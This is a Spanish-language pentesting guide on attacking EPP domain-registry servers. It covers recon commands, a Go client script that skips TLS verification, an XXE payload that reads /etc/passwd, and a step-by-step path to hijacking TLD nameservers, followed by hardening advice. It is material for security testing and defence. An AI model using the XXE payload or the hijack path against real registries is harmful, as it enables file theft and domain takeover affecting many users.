# 700 - Pentesting EPP

{{#include ../banners/hacktricks-training.md}}

## Información Básica

El Protocolo de Aprovisionamiento Extensible (EPP) es un protocolo de red utilizado para la **gestión de nombres de dominio y otros recursos de internet** por parte de registros de nombres de dominio y registradores. Permite la automatización de los procesos de registro, renovación, transferencia y eliminación de nombres de dominio, asegurando un marco de comunicación estandarizado y seguro entre diferentes entidades en el sistema de nombres de dominio (DNS). EPP está diseñado para ser flexible y extensible, permitiendo la adición de nuevas características y comandos a medida que evolucionan las necesidades de la infraestructura de internet.

Básicamente, es uno de los protocolos que un **registrador de TLD va a ofrecer a los registradores de dominios** para registrar nuevos dominios en el TLD.

### Pentest

[**En este artículo muy interesante**](https://hackcompute.com/hacking-epp-servers/) puedes ver cómo algunos investigadores de seguridad encontraron que varias **implementaciones de este protocolo** eran vulnerables a XXE (XML External Entity) ya que este protocolo utiliza XML para comunicarse, lo que habría permitido a los atacantes tomar el control de decenas de TLDs.

---

## Enumeración y Reconocimiento

Los servidores EPP casi siempre escuchan en TCP `700/tcp` sobre TLS. Un despliegue típico también impone **mutual-TLS (mTLS)**, por lo que el cliente debe presentar un certificado válido emitido por la CA del registro. Sin embargo, muchos despliegues privados de prueba o preproducción olvidan ese control:
```bash
# Banner-grabbing / TLS inspection
nmap -p700 --script ssl-cert,ssl-enum-ciphers <target>

# Check if mTLS is *really* required (it frequently is not!)
openssl s_client -connect <target>:700 -quiet \
-servername epp.test 2>/dev/null | head
```
Si el servidor no termina la conexión después del apretón de manos TLS, puedes intentar enviar un mensaje `<hello/>` no autenticado:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<epp xmlns="urn:ietf:params:xml:ns:epp-1.0">
<hello/>
</epp>
```
### Clientes de código abierto útiles para pruebas

* **epp-client (Go)** – mantenido activamente, soporta TCP/TLS y EPP-over-HTTPS (RFC 8730):
`go install github.com/domainr/epp/cmd/epp@latest`
* **gandi/go-epp** – biblioteca de cliente mínima que puede ser fácilmente instrumentada para fuzzing o flujos de trabajo al estilo de nuclei.
* **afq984/php-epp-client** – implementación en PHP utilizada por muchos registradores pequeños; un objetivo conveniente para revisión de código.

Ejemplo de script mínimo de inicio de sesión+verificación con Go epp-client:
```go
package main
import (
"github.com/domainr/epp"
"crypto/tls"
)

func main() {
cfg := &tls.Config{InsecureSkipVerify: true}
c, _ := epp.DialTLS("epp.test:700", cfg)
c.Login("CLIENT_ID", "PASSWORD", nil)
resp, _ := c.DomainCheck("example","com")
println(resp)
}
```
---

## Debilidades Comunes y Vulnerabilidades 2023-2025

| Año  | Componente                       | CWE                                   | Impacto                                                        |
|------|----------------------------------|---------------------------------------|----------------------------------------------------------------|
| 2023 | CoCCA Registry < 3.5            | CWE-611 XXE                           | Lectura de archivos remotos y SSRF a través de carga útil `<epp>` manipulada (parche: 2023-11-02) |
| 2024 | FRED EPP Server 2.x             | CWE-322 Validación insuficiente de certificados TLS | Bypass de mTLS permitió inicio de sesión no autorizado de registrador |
| 2025 | Panel de registrador propietario  | CWE-306 Falta de autenticación para función crítica | Endpoint de aprobación de transferencia de dominio expuesto a través del puente EPP-HTTP |

### Carga útil XXE / SSRF (funciona contra muchas implementaciones de Java/Spring)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<epp xmlns="urn:ietf:params:xml:ns:epp-1.0">
<command>
<check>
<domain:check xmlns:domain="urn:ietf:params:xml:ns:domain-1.0">
<domain:name>&xxe;</domain:name>
</domain:check>
</check>
</command>
</epp>
```
Cuando el analizador está mal configurado (`XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES=true`), el contenido del archivo se devuelve dentro de la estructura `<resData>`.

### Otras conclusiones típicas

1. **Política de credenciales débiles** – las frases de contraseña de inicio de sesión de EPP son más cortas de 8 caracteres; el ataque de fuerza bruta a menudo es factible porque la especificación solo RECOMIENDA (no requiere) limitación de tasa.
2. **Falta de estado `registryLock` / `serverUpdateProhibited`** – una vez autenticados, los atacantes pueden actualizar inmediatamente los registros NS y robar tráfico.
3. **Mensajes de sondeo no firmados** – algunas implementaciones aún no firman los mensajes de preguntas y respuestas de sondeo, lo que permite el suplantación/phishing de operadores de registradores.

---

## Ruta de Ataque: De Cero a Secuestro de TLD

1. Descubrir un punto final de EPP (a menudo oculto detrás de un host genérico como `ot&e.<tld>.nic.<cc>`).
2. Abusar de una de las debilidades anteriores para obtener credenciales a nivel de registrador (XXE → SSRF a IMDSv1, exfiltración de credenciales o bypass de TLS).
3. Emitir solicitudes `<update>` para cambiar los registros `hostObj` del dominio a servidores de nombres controlados por el atacante.
4. (Opcional) Enviar un `<transfer>` para mover el dominio a un registrador controlado por el atacante – muchos registros aún dependen de un **código de autenticación único**.
5. Ganar: control total de la zona DNS, capacidad para solicitar certificados TLS a través de ACME.

---

## Medidas Defensivas y Fortalecimiento

* Hacer cumplir **mTLS con certificados de cliente por registrador** y fijar la CA del registro.
* Establecer `parserFeature secure-processing=true` o equivalente para eliminar XXE.
* Ejecutar **fuzzing continuo** del analizador XML (por ejemplo, con `go-fuzz` o `jazzer` para Java).
* Desplegar estados de **Registro Bloqueado / server*Prohibido** para dominios de alto valor.
* Monitorear la cola `poll` en busca de comandos sospechosos `<transfer>` o `<update>` y alertar en tiempo real.
* Enmiendas al contrato de abuso de DNS de ICANN 2024 requieren que los registros demuestren controles de limitación de tasa y autenticación – aprovéchalos.

## Referencias

* ICANN Security and Stability Advisory Committee (SSAC). "SAC118: Consecuencias de la falta de implementación de controles de seguridad EPP por parte del operador del registro". 2024.
* HackCompute – "Hacking servidores EPP: abusando de XXE para secuestrar TLDs" (2023).
{{#include ../banners/hacktricks-training.md}}
